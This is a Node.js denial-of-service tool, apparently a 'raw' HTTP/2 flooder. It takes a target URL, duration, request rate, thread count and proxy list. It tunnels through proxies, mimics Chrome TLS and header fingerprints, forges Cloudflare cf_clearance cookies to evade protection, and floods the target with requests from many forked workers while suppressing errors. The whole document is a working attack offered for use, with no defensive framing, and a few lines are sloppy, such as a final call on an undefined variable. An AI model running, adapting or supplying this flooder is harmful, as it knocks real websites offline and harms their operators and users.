const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
var colors = require("colors");
const v8 = require("v8");
function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }


const accept_header = [
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
],
cache_header = [
   'max-age=0',
   'no-cache',
   'no-store', 
   'pre-check=0',
   'post-check=0',
   'must-revalidate',
   'proxy-revalidate',
   's-maxage=604800',
   'no-cache, no-store,private, max-age=0, must-revalidate',
   'no-cache, no-store,private, s-maxage=604800, must-revalidate',
   'no-cache, no-store,private, max-age=604800, must-revalidate'

],
Generate_Encoding = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'

],
language_header = [
 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5'
],

dest_header = [
   'document',
   'embed',
   'empty',
   'font',
   'frame',
   'iframe',
   'image',
   'manifest',
   'object',
   'paintworklet',
   'report',
   'script',
   'serviceworker',
   'sharedworker',
   'style',
   'track',
   'video',
   'worker',
   'xslt',
   "unknown",
   "subresource"
],

mode_header = [
   'cors',
   'navigate',
   'no-cors',
   'same-origin',
   'websocket'
],
site_header = [
   'cross-site',
   'same-origin',
   'same-site',
   'none'
],
sec_ch_ua = [
   '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
   '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
   '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
   '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
   '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
   '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"',
   '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="16"',
   '"Google Chrome";v="116", "Chromium";v="116", "Not?A_Brand";v="8"',
   '"Google Chrome";v="115", "Chromium";v="115", "Not?A_Brand";v="99"',
   '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="24"',
   '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="24"',
   '"Chromium";v="116", "Not)A;Brand";v="8", "Google Chrome";v="116"',
   '"Chromium";v="115", "Not)A;Brand";v="8", "Google Chrome";v="115"',
   '"Chromium";v="114", "Not)A;Brand";v="8", "Google Chrome";v="114"',
   '"Chromium";v="113", "Not)A;Brand";v="8", "Google Chrome";v="113"',
   '"Chromium";v="112", "Not)A;Brand";v="8", "Google Chrome";v="112"',
   '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
   '"Chromium";v="115", "Not)A;Brand";v="24", "Google Chrome";v="115"',
   '"Chromium";v="114", "Not)A;Brand";v="24", "Google Chrome";v="114"',
   '"Chromium";v="113", "Not)A;Brand";v="24", "Google Chrome";v="113"',
   '"Chromium";v="112", "Not)A;Brand";v="24", "Google Chrome";v="112"',
   '"Chromium";v="116", "Not)A;Brand";v="99", "Google Chrome";v="116"',
   '"Chromium";v="115", "Not)A;Brand";v="99", "Google Chrome";v="115"',
   '"Chromium";v="114", "Not)A;Brand";v="99", "Google Chrome";v="114"',
   '"Chromium";v="113", "Not)A;Brand";v="99", "Google Chrome";v="113"',
   '"Chromium";v="112", "Not)A;Brand";v="99", "Google Chrome";v="112"',
   '"Chromium";v="116.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="116.0.0.0"',
   '"Chromium";v="115.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="115.0.0.0"',
   '"Chromium";v="114.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="114.0.0.0"',
   '"Chromium";v="113.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="113.0.0.0"',
   '"Chromium";v="112.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="112.0.0.0"',
   '"Chromium";v="116.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.0.0"',
   '"Chromium";v="115.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="115.0.0.0"',
   '"Chromium";v="114.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="114.0.0.0"',
   '"Chromium";v="113.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="113.0.0.0"',
   '"Chromium";v="112.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="112.0.0.0"',
   '"Chromium";v="116.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="116.0.0.0"',
   '"Chromium";v="115.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="115.0.0.0"',
   '"Chromium";v="114.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="114.0.0.0"',
   '"Chromium";v="113.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="113.0.0.0"',
   '"Chromium";v="112.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="112.0.0.0"'
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 6) {
  console.log('node raw target time rate thread proxy'.rainbow);
  process.exit();
}
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function getRandomValue(array) {
    return array[Math.floor(Math.random() * array.length)];
}

          function randnum(_0x4c5a9b, _0x3439ec) {
            const _0x569ffc = "0123456789",
                  _0x4eb85b = Math.floor(Math.random() * (_0x3439ec - _0x4c5a9b + 1)) + _0x4c5a9b,
                  _0x1441ff = Array.from({ "length": _0x4eb85b }, () => {
                    const _0x5c8b5e = Math.floor(Math.random() * _0x569ffc.length);
                    return _0x569ffc[_0x5c8b5e];
                  });
            return _0x1441ff.join("");
          }
          const nodeii = getRandomInt(109, 124);
          const ss = getRandomInt(10, 20);
          const userAgent = Math.random() < 0.5
            ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36`
            : `${generateRandomString(5, 7)}(Mozilla/5.0 (Windows NT ${randnum(0, 10)}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36)${getRandomInt(100, 99999)}.${getRandomInt(100, 99999)}`;
          
          const skid = Math.random() < 0.5 
            ? userAgent 
            : `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${ss}.0 Safari/605.1.15`;


    const browserVersion = getRandomInt(121, 124);

    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

    let brandValue;
    if (browserVersion === 123) {
        brandValue = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
    }
    else if (browserVersion === 124) {
        brandValue = `"Google Chrome";v="124", "Not:A-Brand";v="99", "Chromium";v="124"`;
    }
    else if (browserVersion === 125) {
        brandValue = `"Google Chrome";v="125", "Not:A-Brand";v="24", "Chromium";v="125"`;
    }
    else if (browserVersion === 126) {
        brandValue = `"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"`;
    }
    
    const useragents = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const secChUa = `${brandValue}`;

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
let hcookie = '';
hcookie = `cf_clearance=${randstr(22)}_${randstr(1)}.${randstr(3)}.${randstr(14)}-${timestampString}-1.0-${randstr(6)}+${randstr(80)}=`;

          const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };
            cache = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];

const lol = skid[Math.floor(Math.random() * skid.length)];


const sigalgs = [
       'ecdsa_secp256r1_sha256',
       'ecdsa_secp384r1_sha384',
       'ecdsa_secp521r1_sha512',
       'rsa_pss_rsae_sha256',
       'rsa_pss_rsae_sha384',
       'rsa_pss_rsae_sha512',
       'rsa_pkcs1_sha256',
       'rsa_pkcs1_sha384',
       'rsa_pkcs1_sha512',
] 
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";"GREASE:X25519:x25519";

const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.SSL_OP_NO_TLSv1_3 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";"TLSv1_3_method","TLS_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);


const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
colors.enable();
const coloredString = "Recommended big proxyfile if hard target".white;
if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
   console.clear()
 console.log("HEAP SIZE:", v8.getHeapStatistics().heap_size_limit / (1024 * 1024));
 console.log('Target: '+process.argv[2]);
 console.log('Time: '+process.argv[3]);
 console.log('Rate: '+process.argv[4]);
 console.log('Thread(s): '+process.argv[5]);
 console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);
 console.log("Note: ".brightCyan + coloredString);
       cluster.fork();

   }
} else {for (let i = 0; i < 10; i++) { setInterval(runFlooder, 1) }}

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port,
        allowHalfOpen: true,
        writable: true,
        readable: true
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function cookieString(cookie) {
   var s = "";
   for (var c in cookie) {
     s = `${s} ${cookie[c].name}=${cookie[c].value};`;
   }
   var s = s.substring(1);
   return s.substring(0, s.length - 1);
 }

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
  }
function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"
   
    const randstrsValue = randstr(25);
	
var hd1 = [ 
{ 'x-aspnet-version': randstrsValue},
//{undefined}
]
var hd2 = [ 
{'accept-charset' : randstrsValue},
{'Accept-Ranges': Math.random() < 0.5 ? 'bytes' : 'none'},
//{undefined}
]
const rhd = [
{ "worker": Math.random() < 0.5 ? 'true' : 'null'},
{ "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
{"expect-ct": "enforce"},
//{undefined}
]
var hdd = [
	{ "HTTP2-Setting" : 'token68'},
]
 
   let author = {
       ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
       ":method": "GET",
       ":path": Math.random() < 1 / 100000 ? parsedTarget.path + "?search=" + generateRandomString(2, 3) + "&&lr" + generateRandomString(2, 3) : parsedTarget.path + "?search=null#" + generateRandomString(2, 3) + "&lr=" + generateRandomString(2, 3),
       ":scheme": "https",
       "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
       "accept-encoding": "gzip, deflate, br, zstd",
       "accept-language": "ru,en-US;q=0.9,en;q=0.8"
   }

            const dynHeaders = {
            "user-agent": useragents,
            "sec-ch-ua": secChUa,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-site": "none",
            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
            ...(Math.random() < 0.5 && { "cookie": hcookie }),
            ...(Math.random() < 0.5 && { "referer": `https://${ememmmmmemmeme(6, 6)}.com` }),
            ...(Math.random() < 0.5 ? {"downlink": Math.random() < 0.5 ? "0.5" : "1.0"} : {}),
            ...(Math.random() < 0.5 ? {"RTT": Math.floor(Math.random() * 500) + 100} : {}),
            ...hdd[Math.floor(Math.random() * hdd.length)],
	      	...hd2[Math.floor(Math.random() * hd2.length)],
		      ...rhd[Math.floor(Math.random() * rhd.length)],
		      ...hd1[Math.floor(Math.random() * hd1.length)],
            ...author,
            };
            
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true)

        const settings = {
           enablePush: false,
           initialWindowSize: 1073741823
       };

        const tlsOptions = {
           port: parsedPort,
           secure: true,
           ALPNProtocols: [
               "h2","http/1.1"
           ],
           ciphers: ciphers,
           sigalgs: sigalgs,
           requestCert: true,
           socket: connection,
           ecdhCurve: ecdhCurve,
           honorCipherOrder: false,
           host: parsedTarget.host,
           rejectUnauthorized: false,
           secureOptions: secureOptions,
           secureContext: secureContext,
           servername: parsedTarget.host,
           secureProtocol: secureProtocol
       };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 100000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
           protocol: "https:",
           settings: {
               headerTableSize: 65536,
               maxConcurrentStreams: 1000,
               initialWindowSize: 6291456,
               maxHeaderListSize: 262144,
               enablePush: false
           },
           maxSessionMemory: 3333,
           maxDeflateDynamicTableSize: 4294967295,
           createConnection: () => tlsConn,
           socket: connection,
       });

       client.settings({
           headerTableSize: 65536,
           maxConcurrentStreams: 1000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           maxFrameSize : 40000,
           enablePush: false
       });

       client.setMaxListeners(0);
       client.settings(settings);

        client.on("connect", () => {
           const IntervalAttack = setInterval(() => {
               for (let i = 0; i < args.Rate; i++) {
                   
                   const request = client.request(dynHeaders)
                   
                                   

                   .on("response", response => {
                       request.close();
                       request.destroy();
                       return
                   });
                   request.end();
               }
           }, 550); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
const client = http2.connect(parsed.href, clientOptions, function() {
 });

